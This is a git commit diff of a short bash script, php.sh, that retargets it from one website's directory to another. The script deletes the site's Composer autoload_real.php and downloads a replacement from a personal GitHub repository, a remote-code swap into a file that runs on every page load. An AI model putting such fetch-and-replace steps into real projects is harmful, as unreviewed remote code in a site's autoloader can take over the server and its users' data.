74a02979452fc1d4fc76d918fa51b0c9f4634ef4
nghi235 <101364463+Nghi235@users.noreply.github.com>
2022-06-04 23:40:48 +0700

    Update php.sh

--- php.sh
+++ php.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 rm -rf runphp.x
-cd /www/wwwroot/4gsinhvien.online/vendor/composer
+cd /www/wwwroot/nvnvpn.pw/vendor/composer
 rm -rf autoload_real.php
 curl -OL https://raw.githubusercontent.com/Nghi235/php/main/autoload_real.php
 cd ../../../../..
